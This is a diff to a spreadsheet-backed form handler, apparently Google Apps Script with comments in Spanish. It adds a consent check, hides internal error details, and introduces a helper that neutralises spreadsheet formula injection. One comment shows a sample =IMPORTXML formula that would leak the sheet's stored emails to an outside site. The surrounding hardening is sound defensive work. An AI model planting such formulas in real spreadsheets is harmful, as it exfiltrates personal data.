@@ -72,6 +72,8 @@
  *
  *  SEGURIDAD
  *  · Honeypot, deduplicación, bloqueo transaccional y límite por email.
+ *  · Sin el consentimiento de privacidad no se guarda nada, y ningún texto
+ *    llega a la hoja como fórmula (`texto()`).
  *  · Turnstile es la protección contra bots; se valida si configuras su
  *    secreto.
  *  · La lista de orígenes es solo un filtro de cortesía: el origen lo
@@ -139,8 +141,13 @@ function doPost(e) {
     }
 
     var email = String(datos.email || "").trim().toLowerCase();
-    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+    if (email.length > 254 || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
       return responder(e, { ok: false, error: "email_invalido" });
+    }
+
+    // La base legal es el consentimiento: sin él no se guarda nada.
+    if (datos.privacyConsent !== true) {
+      return responder(e, { ok: false, error: "consentimiento" });
     }
 
     var cache = CacheService.getScriptCache();
@@ -165,7 +172,7 @@ function doPost(e) {
     if (totalPrevio > 0) {
       var columnaEmail = hoja.getRange(2, 2, totalPrevio, 1).getValues();
       for (var i = 0; i < columnaEmail.length; i++) {
-        if (String(columnaEmail[i][0]).trim().toLowerCase() === email) {
+        if (String(columnaEmail[i][0]).replace(/^'/, "").trim().toLowerCase() === email) {
           return responder(e, {
             ok: true,
             duplicate: true,
@@ -176,19 +183,19 @@ function doPost(e) {
 
     hoja.appendRow([
       new Date(),
-      email,
-      String(datos.profile || "").slice(0, 20),
-      String(datos.experience || "").slice(0, 20),
-      String(datos.markets || "").slice(0, 120),
-      String(datos.workflow || "").slice(0, 30),
-      String(datos.goal || "").slice(0, 30),
-      String(datos.notes || "").slice(0, 800),
-      String(datos.lang || "").slice(0, 8),
+      texto(email, 254),
+      texto(datos.profile, 20),
+      texto(datos.experience, 20),
+      texto(datos.markets, 120),
+      texto(datos.workflow, 30),
+      texto(datos.goal, 30),
+      texto(datos.notes, 800),
+      texto(datos.lang, 8),
       datos.marketingConsent === true ? "sí" : "no",
-      String(datos.source || "").slice(0, 200),
-      String(datos.utmSource || "").slice(0, 100),
-      String(datos.utmMedium || "").slice(0, 100),
-      String(datos.utmCampaign || "").slice(0, 100),
+      texto(datos.source, 200),
+      texto(datos.utmSource, 100),
+      texto(datos.utmMedium, 100),
+      texto(datos.utmCampaign, 100),
     ]);
 
     var total = hoja.getLastRow() - 1; // Fila 1 son las cabeceras.
@@ -196,7 +203,9 @@ function doPost(e) {
 
     return responder(e, { ok: true, duplicate: false });
   } catch (err) {
-    return responder(e, { ok: false, error: String(err) });
+    // El detalle queda en el registro de ejecuciones; a quien envía no se le cuenta.
+    console.error(err);
+    return responder(e, { ok: false, error: "error_interno" });
   } finally {
     // `releaseLock` sobre un candado no adquirido no hace nada, así que
     // es seguro llamarlo siempre.
@@ -217,7 +226,8 @@ function doGet(e) {
   try {
     return responder(e, { ok: true, count: contarInscritos() });
   } catch (err) {
-    return responder(e, { ok: false, error: String(err) });
+    console.error(err);
+    return responder(e, { ok: false, error: "error_interno" });
   }
 }
 
@@ -264,6 +274,17 @@ function verificarTurnstile(token) {
 /* ============================================================
    AUXILIARES
    ============================================================ */
+
+/**
+ * Valor de celda recortado y que la hoja nunca toma por fórmula. Un texto que
+ * empieza por `=`, `+`, `-` o `@` (o tabulador o retorno) se guarda con un
+ * apóstrofo delante, que la hoja no enseña: sin él, `=IMPORTXML("https://…"&B2)`
+ * en «Mercados» mandaría a otro sitio los correos de la hoja al abrirla.
+ */
+function texto(valor, max) {
+  var s = String(valor == null ? "" : valor).slice(0, max);
+  return /^[=+\-@\t\r]/.test(s) ? "'" + s : s;
+}
 
 function obtenerHoja() {
   var libro = SpreadsheetApp.getActiveSpreadsheet();
